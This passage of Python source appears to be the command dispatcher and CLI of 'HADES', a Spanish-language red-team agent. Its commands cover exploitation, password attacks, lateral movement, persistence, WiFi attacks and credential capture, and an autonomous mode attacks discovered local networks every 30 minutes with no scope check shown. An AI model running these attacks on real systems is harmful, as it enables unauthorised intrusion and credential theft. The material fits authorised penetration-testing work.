            "wifi [iface]":           "Ataque WiFi completo (aircrack-ng suite)",
            "capture [iface]":        "Captura credenciales LLMNR/NBT-NS (responder)",
            "killchain <ip>":         "Kill chain completa automatizada",
            "killchain <ip> --ext":   "Kill chain + OSINT externo",
        }
        cmds_misc = {
            "tools":   "Listar herramientas detectadas",
            "findings":"Ver hallazgos acumulados en la sesión",
            "clear":   "Limpiar pantalla",
            "exit":    "Salir",
        }

        while True:
            try:
                raw = input(f"\n{C.RED}{C.BOLD}HADES{C.RESET}{C.DIM}@{self.os_profile}{C.RESET} {C.RED}[RT]{C.RESET} {C.CYAN}▶{C.RESET} ").strip()
                if not raw: continue
                parts = raw.split(None, 3)
                cmd = parts[0].lower()
                arg  = parts[1] if len(parts) > 1 else ""
                arg2 = parts[2] if len(parts) > 2 else ""
                arg3 = parts[3] if len(parts) > 3 else ""

                if cmd in ["exit","quit","q"]:
                    log("Sesión terminada."); break
                elif cmd == "help":
                    print(f"\n{C.BOLD}── Reconocimiento & Auditoría ─────────────{C.RESET}")
                    for c, d in cmds_base.items(): print(f"  {C.CYAN}{c:<30}{C.RESET} {d}")
                    print(f"\n{C.BOLD}── Red Team Ofensivo ───────────────────────{C.RESET}")
                    for c, d in cmds_rt.items():   print(f"  {C.RED}{c:<30}{C.RESET} {d}")
                    print(f"\n{C.BOLD}── Misc ────────────────────────────────────{C.RESET}")
                    for c, d in cmds_misc.items(): print(f"  {C.DIM}{c:<30}{C.RESET} {d}")
                elif cmd == "tools":
                    print(f"\n{C.BOLD}Herramientas detectadas ({len(self.tools)}):{C.RESET}")
                    print(self._tools_summary())
                elif cmd == "findings":
                    if not self.findings:
                        print("Sin hallazgos en esta sesión.")
                    else:
                        for i, f in enumerate(self.findings, 1):
                            print(f"\n{C.YELLOW}[{i}] {f['phase'].upper()} — {f.get('target','')}{C.RESET}")
                            print(f.get("analysis","")[:200])
                elif cmd == "clear":
                    os.system("clear"); print(BANNER)
                elif cmd == "scan":
                    self.quick_scan(arg) if arg else log_warn("Uso: scan <target>")
                elif cmd == "recon":
                    self.recon(arg) if arg else log_warn("Uso: recon <target>")
                elif cmd == "fullaudit":
                    self.full_audit(arg) if arg else log_warn("Uso: fullaudit <red/CIDR>")
                elif cmd == "audit":
                    self.audit_iso27001(arg) if arg else log_warn("Uso: audit <target>")
                elif cmd == "analyze":
                    self.analyze_file(arg) if arg else log_warn("Uso: analyze <filepath>")
                elif cmd == "ask":
                    self.ask_and_execute(arg) if arg else log_warn("Uso: ask <pregunta>")
                # ── RED TEAM ──────────────────────────
                elif cmd == "osint":
                    self.osint(arg) if arg else log_warn("Uso: osint <dominio/ip>")
                elif cmd == "enumsmb":
                    self.enum_smb(arg) if arg else log_warn("Uso: enumsmb <ip>")
                elif cmd == "webattack":
                    self.web_exploit(arg) if arg else log_warn("Uso: webattack <url>")
                elif cmd == "pwdattack":
                    self.password_attack(arg, arg2 or "ssh") if arg else log_warn("Uso: pwdattack <ip> <servicio>")
                elif cmd == "crackhash":
                    self.crack_hash(arg) if arg else log_warn("Uso: crackhash <archivo_hashes>")
                elif cmd == "exploit":
                    self.exploit_msf(arg, arg2 or None) if arg else log_warn("Uso: exploit <ip> [módulo]")
                elif cmd == "post":
                    self.post_exploit_local()
                elif cmd == "lateral":
                    self.lateral_movement(arg, arg2 or None, arg3 or None) if arg else log_warn("Uso: lateral <ip> [usuario] [password]")
                elif cmd == "persist":
                    self.persistence(arg or "cron")
                elif cmd == "wifi":
                    self.wifi_full_attack(arg or None)
                elif cmd == "capture":
                    self.capture_credentials(arg or None)
                elif cmd == "killchain":
                    ext = "--ext" in raw
                    self.kill_chain(arg, external=ext) if arg else log_warn("Uso: killchain <ip> [--ext]")
                else:
                    log_warn(f"Comando desconocido: '{cmd}'. Escribe 'help'.")

            except KeyboardInterrupt:
                print(f"\n{C.DIM}[Ctrl+C — escribe 'exit' para salir]{C.RESET}")
            except EOFError:
                break

    def auto_mode(self):
        print(BANNER)
        log_h("MODO RED TEAM AUTÓNOMO — Ciclo cada 30 minutos")
        cycle = 0
        while True:
            cycle += 1
            log_h(f"CICLO #{cycle} — {datetime.now().strftime('%H:%M:%S')}")
            out, _, _ = run_cmd("ip route | grep -v default | awk '{print $1}' | head -3")
            nets = [n.strip() for n in out.splitlines() if "/" in n]
            if nets:
                for net in nets[:2]:
                    self.full_audit(net)
            else:
                log_warn("Sin redes. Ejecutando post-explotación local...")
                self.post_exploit_local()
            log(f"Próximo ciclo en 30 minutos...")
            time.sleep(1800)

# ─────────────────────────────────────────────
# PID / STATUS
# ─────────────────────────────────────────────
def write_pid():
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

def read_pid():
    try:
        with open(PID_FILE) as f:
            return int(f.read())
    except: return None

def stop_agent():
    pid = read_pid()
    if not pid:
        print(f"{C.YELLOW}No hay agente en background.{C.RESET}"); return
    try:
        os.kill(pid, signal.SIGTERM)
        os.remove(PID_FILE)
        print(f"{C.GREEN}Agente detenido (PID {pid}).{C.RESET}")
    except:
        print(f"{C.YELLOW}Proceso {pid} ya no existe.{C.RESET}")
        try: os.remove(PID_FILE)
        except: pass

def agent_status():
    pid = read_pid()
    tools = detect_tools()
    model = check_ollama()
    print(f"\n{C.BOLD}══════════════ HADES STATUS ══════════════{C.RESET}")
    print(f"  Sistema OS    : {C.CYAN}{detect_os().upper()}{C.RESET}")
    print(f"  Ollama modelo : {C.GREEN if model else C.RED}{model or 'NO DISPONIBLE'}{C.RESET}")
    print(f"  Herramientas  : {C.GREEN}{len(tools)}{C.RESET} detectadas")
    print(f"  PID agente    : {C.GREEN if pid else C.DIM}{pid or 'No activo'}{C.RESET}")
    print(f"  Ollama URL    : {OLLAMA_URL}")
    print(f"  Log           : {LOG_FILE}")
    print(f"  Reportes      : {REPORT_DIR}")
    print(f"{C.BOLD}══════════════════════════════════════════{C.RESET}\n")

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    tier = _os_tier()
    os_name = detect_os().upper()

    desc = (
        f"HADES-LOCAL v2.0.0-REDTEAM  |  Tier: {'FULL RED TEAM' if tier == 'full' else 'LIMITED (FREE)'}\n"
        f"OS detectado: {os_name}\n"
        "Capacidades completas en Kali Linux, Parrot OS y Purple Linux.\n"
        "HADES PRO / HADES CORE: capacidades extendidas en cualquier plataforma."
    )
    parser = argparse.ArgumentParser(description=desc, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="command")

    # ── Comandos base (disponibles en cualquier OS) ──
    p = sub.add_parser("start",     help="Iniciar shell interactiva (--auto para modo automático)")
    p.add_argument("--auto", action="store_true")
    p = sub.add_parser("scan",      help="Escaneo rápido de puertos"); p.add_argument("target")
    p = sub.add_parser("recon",     help="Reconocimiento completo");    p.add_argument("target")
    p = sub.add_parser("fullaudit", help="Auditoría completa de red");  p.add_argument("range")
    p = sub.add_parser("audit",     help="Auditoría ISO 27001");        p.add_argument("target")
    p = sub.add_parser("analyze",   help="Analizar archivo");           p.add_argument("file")
    sub.add_parser("stop",   help="Detener agente HADES")
    sub.add_parser("status", help="Estado del agente")
    sub.add_parser("tools",  help="Listar herramientas detectadas")

    # ── Comandos Red Team (solo Kali / Parrot / Purple) ──
    rt_note = " [REQUIERE Kali/Parrot/Purple]" if tier != "full" else ""
    p = sub.add_parser("osint",      help=f"OSINT sobre objetivo{rt_note}");            p.add_argument("target")
    p = sub.add_parser("killchain",  help=f"Kill chain automatizado{rt_note}");          p.add_argument("target"); p.add_argument("--external", action="store_true")
    p = sub.add_parser("exploit",    help=f"Explotar con Metasploit{rt_note}");          p.add_argument("target"); p.add_argument("--module", default="")
    p = sub.add_parser("post",       help=f"Post-explotación local{rt_note}")
    p = sub.add_parser("pwdattack",  help=f"Ataque de contraseñas{rt_note}");            p.add_argument("target"); p.add_argument("service"); p.add_argument("--users", default="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"); p.add_argument("--passwords", default="/usr/share/wordlists/rockyou.txt")
    p = sub.add_parser("webattack",  help=f"Ataque web completo{rt_note}");              p.add_argument("url")
    p = sub.add_parser("wifiattack", help=f"Ataque WiFi completo{rt_note}");             p.add_argument("interface")
    p = sub.add_parser("capture",    help=f"Capturar credenciales (Responder){rt_note}"); p.add_argument("interface"); p.add_argument("--duration", type=int, default=300)
    p = sub.add_parser("lateral",    help=f"Movimiento lateral{rt_note}");               p.add_argument("target"); p.add_argument("username"); p.add_argument("--password", default=""); p.add_argument("--hash", default="")
    p = sub.add_parser("persist",    help=f"Establecer persistencia{rt_note}");          p.add_argument("method", choices=["cron","service","bashrc"])

    args = parser.parse_args()
    if not args.command:
        print(BANNER); parser.print_help(); sys.exit(0)

    # Instantiate RedTeamEngine — inherits all HadesEngine capabilities
    engine = RedTeamEngine()

    # ── Dispatch base commands ──
    if   args.command == "start":     engine.auto_mode() if args.auto else engine.interactive_shell()
    elif args.command == "scan":      print(BANNER); engine.quick_scan(args.target)
    elif args.command == "recon":     print(BANNER); engine.recon(args.target)
    elif args.command == "fullaudit": print(BANNER); engine.full_audit(args.range)
    elif args.command == "audit":     print(BANNER); engine.audit_iso27001(args.target)
    elif args.command == "analyze":   print(BANNER); engine.analyze_file(args.file)
    elif args.command == "stop":      stop_agent()
    elif args.command == "status":    agent_status()
    elif args.command == "tools":
        tools = detect_tools()
        tier_label = f"{C.GREEN}FULL RED TEAM{C.RESET}" if tier == "full" else f"{C.YELLOW}LIMITED (FREE — instala en Kali/Parrot/Purple para acceso completo){C.RESET}"
        print(f"\n{C.BOLD}Herramientas detectadas en {os_name} ({len(tools)} total) — Tier: {tier_label}{C.RESET}")
        cats = {}
        for t, m in tools.items():
            cats.setdefault(m["category"],[]).append((t, m["desc"]))
        for cat, items in sorted(cats.items()):
            print(f"\n  {C.CYAN}[{cat.upper()}]{C.RESET}")
            for tool, desc in items:
                print(f"    {C.GREEN}✓{C.RESET} {tool:<20} {C.DIM}{desc}{C.RESET}")
        print()

    # ── Dispatch Red Team commands (require full tier) ──
    elif args.command == "osint":
        _require_full_tier(); print(BANNER); engine.osint(args.target)
    elif args.command == "killchain":
        _require_full_tier(); print(BANNER); engine.kill_chain(args.target, args.external)
    elif args.command == "exploit":
        _require_full_tier(); print(BANNER); engine.exploit_msf(args.target, args.module)
    elif args.command == "post":
        _require_full_tier(); print(BANNER); engine.post_exploit_local()
    elif args.command == "pwdattack":
        _require_full_tier(); print(BANNER); engine.password_attack(args.target, args.service, args.users, args.passwords)
    elif args.command == "webattack":
        _require_full_tier(); print(BANNER); engine.web_exploit(args.url)
    elif args.command == "wifiattack":
        _require_full_tier(); print(BANNER); engine.wifi_full_attack(args.interface)
    elif args.command == "capture":
        _require_full_tier(); print(BANNER); engine.capture_credentials(args.interface, args.duration)
    elif args.command == "lateral":
        _require_full_tier(); print(BANNER); engine.lateral_movement(args.target, args.username, args.password, args.hash)
    elif args.command == "persist":
        _require_full_tier(); print(BANNER); engine.persistence(args.method)

if __name__ == "__main__":
    main()
